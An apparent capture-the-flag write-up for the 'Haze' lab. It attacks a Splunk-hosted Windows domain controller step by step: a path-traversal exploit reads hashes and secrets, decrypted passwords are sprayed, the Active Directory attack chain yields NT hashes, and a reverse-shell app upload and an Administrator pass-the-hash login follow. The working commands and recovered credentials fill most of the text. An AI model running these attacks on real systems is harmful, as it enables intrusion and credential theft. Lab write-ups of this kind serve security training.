1, port scan
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-03 11:23:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp open  http          Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
|_http-server-header: Splunkd
8088/tcp open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
|_http-server-header: Splunkd
|_http-title: 404 Not Found
| http-robots.txt: 1 disallowed entry 
|_/
8089/tcp open  ssl/http      Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Firstly, I would want to check the web-service `port 8000 Splunkd httpd`
![](images/Pasted%20image%2020250404012656.png)
By using whatweb to check the valid information about that
```
whatweb http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F [200 OK] Bootstrap, Cookies[cval,splunkweb_uid], Country[RESERVED][ZZ], HTML5, HTTPServer[Splunkd], IP[10.10.11.61], Meta-Author[Splunk Inc.], Script[text/json], probably Splunk, UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]
```
We did not get any versions of `splunkd httpd`
But by searching the exploits from exploit-db, I find something interesting from that
![](images/Pasted%20image%2020250404013042.png)
I have tried the `Splunk 9.0.4 - Information Disclosure`, but the poc is not worked here.
![](images/Pasted%20image%2020250404013124.png)

From `Splunk 9.0.5 - admin account take over`, it still need a low-privilege user who holds a role that has the `edit_user` capability assigned.But we did not have anything right now.

Then I would target to SMB service
```
smbclient -L //10.10.11.61    
Password for [WORKGROUP\wither]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.61 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


smbmap -H 10.10.11.61                       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.10.11.61, no fun for you...                                                                          
[*] Closed 1 connections   
```
It still needs the valid credit here.
But by continuing check the CVE documents of the `splunk`, we can find more information from that.
![](images/Pasted%20image%2020250404014727.png)
The first one seems like our target here
`Path Traversal on the “/modules/messaging/“ endpoint in Splunk Enterprise on Windows`
We can also find the exploit script from github
`https://github.com/bigb0x/CVE-2024-36991.git`
Then we can successfully get the hashes of the valid users
```
python3 CVE-2024-36991.py -u http://10.10.11.61:8000
/home/wither/Templates/htb-labs/Haze/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence '\ '
  """)

                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|
                                                                           
-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
-> By x.com/MohamedNab1l
-> Use Wisely.

[INFO] Log directory created: logs
[INFO] Testing single target: http://10.10.11.61:8000
[VLUN] Vulnerable: http://10.10.11.61:8000
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152

```
Then let's try to crack them, but after 20 mins there is nothing found here.That is a rabbit hole here.

By checking the document of `splunk`, we can found something interesting from
`https://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Configurationfiledirectories`
We can get the directory of config file 
`/Splunk/etc/system/local/server.conf`
Then we can get that by LFI
```
curl -s "http:/haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/server.conf"
[general]
serverName = dc01
pass4SymmKey = $7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA==

[sslConfig]
sslPassword = $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==

[lmpool:auto_generated_pool_download-trial]
description = auto_generated_pool_download-trial
peers = *
quota = MAX
stack_id = download-trial

[lmpool:auto_generated_pool_forwarder]
description = auto_generated_pool_forwarder
peers = *
quota = MAX
stack_id = forwarder

[lmpool:auto_generated_pool_free]
description = auto_generated_pool_free
peers = *
quota = MAX
stack_id = free

curl -s "http:/haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.secret"
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD

wget http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/authentication.conf

```

Then we can use https://github.com/HurricaneLabs/splunksecrets to crack these hashes here
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Haze/CVE-2024-36991]
└─$ splunksecrets splunk-decrypt -S splunk.secret
Ciphertext: $7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA==
changeme
                                                                                      
┌──(wither㉿localhost)-[~/Templates/htb-labs/Haze/CVE-2024-36991]
└─$ splunksecrets splunk-decrypt -S splunk.secret
Ciphertext: $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==
password

splunksecrets splunk-decrypt -S splunk.secret
Ciphertext: $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
Ld@p_Auth_Sp1unk@2k24

```
Then we successfully get the password of `Paul.Taylor`
Let's Poop rid & Spray piss
```
crackmapexec smb haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute
crackmapexec smb haze.htb -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24'

Then we can make a user.txt
and

crackmapexec smb haze.htb -u user.txt -p 'Ld@p_Auth_Sp1unk@2k24'
/usr/lib/python3/dist-packages/cme/cli.py:35: SyntaxWarning: invalid escape sequence '\ '
  """,
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
SMB         haze.htb        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         haze.htb        445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
```

Then we can successfully get into `mark.adams`
```
ldapdomaindump -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -o ldapdump haze.htb

evil-winrm -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -i haze.htb
whoami /all
USER INFORMATION
----------------

User Name       SID
=============== ===========================================
haze\mark.adams S-1-5-21-323145914-28650650-2368316563-1104


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
HAZE\gMSA_Managers                          Group            S-1-5-21-323145914-28650650-2368316563-1107 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

Then let's upload the `SharpHound` to check what to do next.
In this place, we have to know `mark` is the group member of `HAZE\gMSA_Managers  `
That means we can change the group of `mark`
let's gMSA_Managers group exploit
```
Set-ADServiceAccount -Identity 'Haze-IT-Backup$' -PrincipalsAllowedToRetrieveManagedPassword 'mark.adams'

netexec ldap haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
[*] Initializing FTP protocol database
[*] Initializing VNC protocol database
[*] Initializing SSH protocol database
[*] Initializing NFS protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WMI protocol database
[*] Initializing RDP protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM: 735c02c6b2dc54c3c8c6891f55279ebc
```
Then we can Pour the blood & drink it
```
bloodhound-python -u 'Haze-IT-Backup$' --hashes ':735c02c6b2dc54c3c8c6891f55279ebc' -d haze.htb -c all -dc dc01.haze.htb -ns 10.10.11.61 --dns-tcp --zip
```
In this place, it would be clear for us to find the path to Administror
![](images/Pasted%20image%2020250404030501.png)
Firstly, Support_Services group exploit, we can use that to get the owner of `edward.martin`
```
bloodyAD --host 10.10.11.61 -d haze.htb -u 'Haze-IT-Backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 set owner 'Support_Services' 'Haze-IT-Backup$'
bloodyAD --host 10.10.11.61 -d haze.htb -u 'Haze-IT-Backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 add genericAll 'Support_Services' 'Haze-IT-Backup$'
bloodyAD --host 10.10.11.61 -d haze.htb -u 'Haze-IT-Backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 add groupMember 'Support_Services' 'Haze-IT-Backup$'
pywhisker --dc-ip 10.10.11.61 -d 'haze.htb' -u 'Haze-IT-Backup$' -H ':735c02c6b2dc54c3c8c6891f55279ebc' --target 'edward.martin' --action 'add' --filename edward
python3 /opt/PKINITtools/gettgtpkinit.py haze.htb/edward.martin -cert-pfx edward.pfx -pfx-pass b09mqaCGCI3vsGDn5TyT edward.ccache
export KRB5CCNAME=edward.ccache
python3 /opt/PKINITtools/getnthash.py haze.htb/edward.martin -key c28f7ac8d18c6bfd2f571f3e6ddcb78d878e234c6a5378f196c426b19541b84d

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
09e0b3eeb2e7a6b0d419e9ff8f4d91af


evil-winrm -u 'edward.martin' -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af' -i haze.htb
```

Then come to download the backup of Splunk
```
download C:\Backups\Splunk\splunk_backup_2024-08-06.zip
```

```
grep -rnE '\$[0-9]\$' Splunk
Splunk/etc/system/README/indexes.conf.spec:2222:* Unencrypted access key cannot begin with "$1$" or "$7$". These prefixes are reserved
Splunk/etc/system/README/indexes.conf.spec:2234:* Unencrypted secret key cannot begin with "$1$" or "$7$". These prefixes are reserved
Splunk/etc/system/README/inputs.conf.example:98:token = $7$ifQTPTzHD/BA8VgKvVcgO1KQAtr3N1C8S/1uK3nAKIE9dd9e9g==
Splunk/etc/system/README/user-seed.conf.example:21:HASHED_PASSWORD = $6$TOs.jXjSRTCsfPsw$2St.t9lH9fpXd9mCEmCizWbb67gMFfBIJU37QF8wsHKSGud1QNMCuUdWkD8IFSgCZr5.W6zkjmNACGhGafQZj1
Splunk/etc/system/README/server.conf.spec:159:* Unencrypted passwords must not begin with "$1$". This is used by
Splunk/etc/system/README/server.conf.spec:614:    * NOTE: Unencrypted passwords must not begin with "$1$", because this is
Splunk/etc/system/README/server.conf.spec:2331:* Unencrypted passwords must not begin with "$1$", as Splunk software uses
Splunk/etc/system/README/server.conf.spec:3772:* Unencrypted passwords must not begin with "$1$", as this is used by
Splunk/etc/system/README/server.conf.spec:4290:* Unencrypted passwords must not begin with "$1$", as this is used by
Splunk/etc/system/README/server.conf.spec:5196:* Unencrypted passwords must not begin with "$1$", as this is used by
Splunk/etc/system/README/server.conf.spec:5237:* Unencrypted passwords must not begin with "$1$", as this is used by
Splunk/etc/system/README/outputs.conf.example:55:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==
Splunk/etc/passwd:1::admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934
grep: Splunk/bin/tsidxprobe_plo.exe: binary file matches
grep: Splunk/bin/locktest.exe: binary file matches
grep: Splunk/bin/walklex.exe: binary file matches
grep: Splunk/bin/_decimal.p3d: binary file matches
grep: Splunk/bin/splunk-optimize-lex.exe: binary file matches
grep: Splunk/bin/tsidxprobe.exe: binary file matches
grep: Splunk/bin/splknetdrv.sys: binary file matches
grep: Splunk/bin/splunk-optimize.exe: binary file matches
grep: Splunk/opt/packages/identity-0.0.1-ac30d8f.tar.gz: binary file matches
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:15:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:3:pass4SymmKey = $7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow==
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:6:sslPassword = $7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog==
grep: Splunk/var/lib/splunk/_introspection/db/db_1722374971_1722374511_0/rawdata/journal.zst: binary file matches
grep: Splunk/var/lib/splunk/_introspection/db/db_1722472316_1722471805_2/1722472316-1722471805-7069930062775889648.tsidx: binary file matches
Splunk/lib/node_modules/pdfkit/lib/mixins/color.coffee:10:                color = color.replace(/#([0-9A-F])([0-9A-F])([0-9A-F])/i, "#$1$1$2$2$3$3") if color.length is 4
                                                                                                                               
```
`Splunk/etc/passwd:1::admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934`
`Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:15:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=`

```
splunksecrets splunk-legacy-decrypt -S Splunk/etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='

splunk creds admin:Sp1unkadmin@2k24
```
Then we can use this credit to login into the dashboard
![](images/Pasted%20image%2020250404004051.png)
spawn meterpreter shell and exploit SeImpersonatePrivilege
![](images/Pasted%20image%2020250404015246.png)
Press the button of Manage Apps, then you can install app from file
![](images/Pasted%20image%2020250404015321.png)
For our payload file, 

```
Depending on the target machine, you will either need to edit the rev.py for unix type machines or run.ps1 for Windows machines. Enter your attacking machine IP and ports

tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
mv reverse_shell_splunk.tgz reverse_shell_splunk.spl

Launch your listener and upload this package via the app installation page.

```
Then we can successfully get the reverse shell as SYSTEM

```
Bonus
`evil-winrm -u 'Administrator' -H '06dc954d32cb91ac2831d67e3e12027f' -i 10.10.11.61`
```